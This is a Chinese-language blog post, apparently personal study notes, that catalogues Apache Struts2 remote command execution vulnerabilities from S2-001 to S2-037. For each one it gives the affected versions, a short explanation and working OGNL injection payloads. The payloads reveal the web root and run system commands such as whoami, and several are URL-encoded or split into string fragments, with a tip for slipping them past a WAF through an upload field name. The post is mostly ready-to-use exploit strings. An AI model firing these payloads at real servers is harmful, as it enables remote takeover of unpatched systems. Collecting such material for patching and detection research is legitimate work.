---
title: Struts2命令执行各版本记录
date: 2017-01-13 16:57:47
tags: 
 - java
categories: notes
---

#### 概述
最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏

<!-- more -->

- [http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)
- [http://www.cnblogs.com/LittleHann/p/4606891.html](http://www.cnblogs.com/LittleHann/p/4606891.html)
- [https://cwiki.apache.org/confluence/display/WW/S2-xxx](https://cwiki.apache.org/confluence/display/WW/S2-xxx)
- http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html
- https://cwiki.apache.org/confluence/display/WW/S2-009

## Struts2命令执行集合
下文不是具体的分析文，能力有限，仅记录一下以做将来复习查用。
过段时间会将所有的漏洞环境上传到github上，环境来源大部分为我偶像[rickgray](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)博客上共享的以及官网上下的对应版本的示例环境。
update:2017/1/16 [环境地址](https://github.com/0kami/Struts2Environment/)

#### Struts2 S2-001

    影响版本：2.0.0 - 2.0.8
    具体详情：https://struts.apache.org/docs/s2-001.html


> 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行

上文引用[rickgray](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)的描述。
###### 构造PoC
######## 获取tomcat执行路径

```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```
######## 获取web根目录

```
%{##req=@org.apache.struts2.ServletActionContext@getRequest(),##response=##context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),##response.println(##req.getRealPath('/')),##response.flush(),##response.close()}
```
######## 执行系统命令

```
%{##a=(new java.lang.ProcessBuilder("whoami")).start(),##b=##a.getInputStream(),##c=new java.io.InputStreamReader(##b),##d=new java.io.BufferedReader(##c),##e=new char[50000],##d.read(##e),##matt=##context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),##matt.getWriter().println(new java.lang.String(##e)),##matt.getWriter().flush(),##matt.getWriter().close()}
```

#### Struts2 S2-005

    影响版本: 2.0.0 - 2.1.8.1
    漏洞详情: http://struts.apache.org/docs/s2-005.html


>struts2漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为ongl语句执行(可理解为java代码)。ongl表达式通过##来访问struts的对象，struts框架通过过滤##字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式讲这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上

上文引用[LittleHann](http://www.cnblogs.com/LittleHann/p/4606891.html)的描述

###### 构造PoC
######## 获取web根目录

```
('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i97)(('\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))')(d))&(i99)(('\43xman.getWriter().close()')(d))
```

######## 执行系统命令

```
('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'"+cmd+"\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
```

上面2个PoC摘自k8team，为了写PoC，有所改动，但是这里就不贴上来了：）

#### Struts2 S2-009


    影响版本: 2.0.0 - 2.3.1.1
    漏洞详情: https://struts.apache.org/docs/s2-009.html


漏洞利用点跟S2-003和S2-005类似，利用OGNL表达式(1)(2),会执行1的OGNL表达式，009构造了的方法为test=(some OGNL 表达式)(1)&z[(test)(1)]=true。
z[(test)(1)]=true,对struts2来说是合法的参数，但是(test)(1)会执行上述说的方法，test的值被带入计算，造成命令执行。

###### 构造PoC
######## 弹计算器 
ps:实验环境试了好几次都不能执行系统命令，路过的大佬求指教：）

```
person.name=(##context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), ##_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app'))(meh)&z[(person.name)('meh')]=true
```
用的是`person/new-person.action`这个控制器

######## 获取web根目录

```
person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&z%5B%28person.name%29%28%27meh%27%29%5D"
```
#### Struts2 S2-012

    影响版本: 2.0.0 - 2.3.13
    漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-012


Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量,struts在获取其值时会执行OGNL表达式，从而造成命令执行

###### 构造PoC
######## 获取web根路径

```
%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D
```

######## 执行系统命令

```
%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A
```
#### Struts2 S2-013/S2-014

    影响版本: 2.0.0 - 2.3.14.1
    漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014


标签`s:url`和`s:a`中提供include参数，其参数值可以为

1. none - include no parameters in the URL (default)
2. get - include only GET parameters in the URL
3. all - include both GET and POST parameters in the URL

如果参数值为get或all，在获取对应的参数值时执行了OGNL表达式

###### 构造PoC
######## 获取web根目录
```
a=${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println('webpath%3a'%2b%23req.getRealPath("/")),%23out.close())}
```
######## 执行系统命令
```
a=${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('"+cmd+"').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println('dbapp%3a'%2bnew java.lang.String(%23d)),%23out.close())}
```
#### Struts2 S2-016

    影响版本: 2.0.0 - 2.3.15
    漏洞详情: https://struts.apache.org/docs/s2-016.html


​    
>DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction: 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行

上文引用[rickgray](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)的描述。

###### 构造PoC
######## 获取web根目录

```
?redirect:${##req=##context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),##resp=##context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),##resp.setCharacterEncoding('UTF-8'),##ot=##resp.getWriter (),##ot.print('web'),##ot.print('path:'),##ot.print(##req.getSession().getServletContext().getRealPath('/')),##ot.flush(),##ot.close()}
```
######## 执行系统命令

```
?redirect:${##a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),##b=##a.getInputStream(),##c=new java.io.InputStreamReader(##b),##d=new java.io.BufferedReader(##c),##e=new char[50000],##d.read(##e),##matt=##context.get('co'+'m.ope'+'nsymph'+'ony.x'+'wor'+'k2.disp'+'atch'+'er.HttpSe'+'rvletRe'+'sponse'),##matt.getWriter().println(new java.lang.String(##e)),##matt.getWriter().flush(),##matt.getWriter().close()}'
```

还有一种比较隐蔽的方法，将PoC放在文件上传的name处，过waf。
#### Struts2 S2-019
    影响版本: 2.0.0 - 2.3.15.1
    漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-019

该漏洞成因为开启了开发者模式，传入`debug=command&expression=`导致执行OGNL表达式，从而造成命令执行漏洞。

###### 构造PoC
######## 获取web根路径
```
debug=command&expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29
```

######## 执行系统命令
```
debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A
```

#### Struts2 S2-032

    影响版本: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3)
    漏洞详情: https://struts.apache.org/docs/s2-032.html


> 在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》

上文引用[rickgray](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html)的描述。

###### 构造PoC
######## 获取web根目录

```
?method:##_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,##req=##context.get(##parameters.a[0]),##resp=##context.get(##parameters.b[0]),##resp.setCharacterEncoding(##parameters.c[0]),##ot=##resp.getWriter (),##ot.print(##parameters.e[0]+##req.getSession().getServletContext().getRealPath(##parameters.d[0])),##ot.flush(),##ot.close&a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&c=UTF-8&d=/&e=webpath:
```

######## 执行系统命令

```
?method:##_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,##a=(new java.lang.ProcessBuilder(##parameters.a[0])).start(),##b=##a.getInputStream(),##c=new java.io.InputStreamReader(##b),##d=new java.io.BufferedReader(##c),##e=new char[50000],##d.read(##e),##matt=##context.get(##parameters.b[0]),##matt.getWriter().println(##parameters.c[0]+new java.lang.String(##e)),##matt.getWriter().flush(),##matt.getWriter().close&a=whoami&b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&c=flag:
```

#### Struts2 S2-037

    影响版本: 2.3.20 - 2.3.28.1
    漏洞详情: http://struts.apache.org/docs/s2-037.html


> 这个漏洞和之前S2-032/033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。

上文引用[nsfocus](http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)的描述

###### 构造PoC
######## 获取web根目录

```
/(##_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(##req=##context.get(##parameters.a[0]),##resp=##context.get(##parameters.b[0]),##resp.setCharacterEncoding(##parameters.c[0]),##ot=##resp.getWriter (),##ot.print(##parameters.e[0]+##req.getSession().getServletContext().getRealPath(##parameters.d[0])),##ot.flush(),##ot.close):xx.toString.json?&a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&c=UTF-8&d=/&e=webpath:
```
######## 执行系统命令

```
/(##_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(##a=(new java.lang.ProcessBuilder(##parameters.a[0])).start(),##b=##a.getInputStream(),##c=new java.io.InputStreamReader(##b),##d=new java.io.BufferedReader(##c),##e=new char[50000],##d.read(##e),##matt=##context.get(##parameters.b[0]),##matt.getWriter().println(##parameters.c[0]+new java.lang.String(##e)),##matt.getWriter().flush(),##matt.getWriter().close()):xx.toString.json?&a=whoami&b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&c=flag:
```

## 总结
Struts2命令执行算是一个比较经典的漏洞了，希望以后深入java的一些框架，可以从底层来分析：）








